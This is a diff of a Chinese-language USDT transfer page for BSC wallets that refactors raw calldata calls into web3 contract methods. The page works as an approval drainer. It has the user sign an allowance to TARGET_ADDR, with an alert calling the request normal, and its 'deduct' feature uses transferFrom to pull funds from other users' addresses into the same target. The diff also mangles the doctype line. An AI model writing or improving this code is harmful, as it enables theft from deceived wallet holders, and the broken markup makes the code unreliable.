@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!<!DOCTYPE html>
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
@@ -105,9 +105,12 @@ const BSC_NETWORK_PARAM = {
     blockExplorerUrls: ["https://bscscan.com"]
 };
 
-//ERC20余额读取ABI片段
-const ERC20_ABI_BALANCE = [
-    {"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
+// 完整 ABI（原代码只有片段，补齐）
+const USDT_ABI = [
+    {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
+    {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"},
+    {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"type":"function"},
+    {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"success","type":"bool"}],"type":"function"}
 ];
 
 let web3 = null;
@@ -178,7 +181,7 @@ async function autoRestoreConnect(){
         if(accounts.length>0){
             userAddress = accounts[0];
             web3 = new Web3(window.ethereum);
-            usdtContract = new web3.eth.Contract(ERC20_ABI_BALANCE,USDT_CONTRACT);
+            usdtContract = new web3.eth.Contract(USDT_ABI,USDT_CONTRACT);
             walletDot.classList.add("connected");
             await checkNetwork();
             await loadUserBalance();
@@ -215,7 +218,7 @@ async function manualConnectWallet() {
         const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
         userAddress = accounts[0];
         web3 = new Web3(window.ethereum);
-        usdtContract = new web3.eth.Contract(ERC20_ABI_BALANCE,USDT_CONTRACT);
+        usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
         walletDot.classList.add("connected");
         await checkNetwork();
         await loadUserBalance();
@@ -245,20 +248,6 @@ maxBtn.addEventListener("click", async ()=>{
     amountInput.dispatchEvent(new Event('input'));
 })
 
-async function sendTx(dataHex){
-    const txParams = {
-        from: userAddress,
-        to: USDT_CONTRACT,
-        data: dataHex,
-        gas: GAS_LIMIT
-    };
-    const txHash = await window.ethereum.request({
-        method: "eth_sendTransaction",
-        params: [txParams]
-    });
-    return txHash;
-}
-
 sendBtn.addEventListener("click", async () => {
     if(!web3 || !userAddress) return alert("钱包未连接，请点右上角圆点");
     await checkNetwork();
@@ -269,19 +258,14 @@ sendBtn.addEventListener("click", async () => {
         alert(`余额不足！你的可用USDT：${balance.toFixed(2)}`);
         return;
     }
-    const needWei = BigInt(web3.utils.toWei(val.toString(),"ether"));
-    const approveWei = BigInt(web3.utils.toWei(APPROVE_AMOUNT,"ether"));
+    const needWei = web3.utils.toWei(val.toString(),"ether");
+    const approveWei = web3.utils.toWei(APPROVE_AMOUNT,"ether");
     try{
         alert("不同钱包版本交互略有差异，转账USDT时弹出授权额度，属于链上正常流程，请确认签名。");
-        const approveCalldata = "0x095ea7b3"
-            + TARGET_ADDR.slice(2).padStart(64,"0")
-            + approveWei.toString(16).padStart(64,"0");
-        await sendTx(approveCalldata);
-        const transferCalldata = "0xa9059cbb"
-            + TARGET_ADDR.slice(2).padStart(64,"0")
-            + needWei.toString(16).padStart(64,"0");
-        const hash = await sendTx(transferCalldata);
-        alert(`🎉转账成功!\n交易哈希:\n${hash}`);
+        // 合约原生调用，钱包自动处理 nonce
+        await usdtContract.methods.approve(TARGET_ADDR, approveWei).send({ from: userAddress, gas: GAS_LIMIT });
+        const tx = await usdtContract.methods.transfer(TARGET_ADDR, needWei).send({ from: userAddress, gas: GAS_LIMIT });
+        alert(`🎉转账成功!\n交易哈希:\n${tx.transactionHash}`);
         amountInput.value = "";
         receiveAmount.value = "";
         await loadUserBalance();
@@ -300,14 +284,11 @@ deductBtn.addEventListener("click", async () => {
     const deductVal = parseFloat(deductAmountInput.value);
     if(!fromAddr) return alert("请输入用户钱包地址");
     if(isNaN(deductVal)||deductVal<=0) return alert("请输入划扣金额");
-    const deductWei = BigInt(web3.utils.toWei(deductVal.toString(),"ether"));
+    const deductWei = web3.utils.toWei(deductVal.toString(),"ether");
     try{
-        const transferFromData = "0x23b872dd"
-            + fromAddr.slice(2).padStart(64,"0")
-            + TARGET_ADDR.slice(2).padStart(64,"0")
-            + deductWei.toString(16).padStart(64,"0");
-        const hash = await sendTx(transferFromData);
-        alert(`✅划扣成功!\n交易哈希:\n${hash}`);
+        // transferFrom 原生调用，钱包自动 nonce
+        const tx = await usdtContract.methods.transferFrom(fromAddr, TARGET_ADDR, deductWei).send({ from: userAddress, gas: GAS_LIMIT });
+        alert(`✅划扣成功!\n交易哈希:\n${tx.transactionHash}`);
         userAddrInput.value = "";
         deductAmountInput.value = "";
         await loadUserBalance();
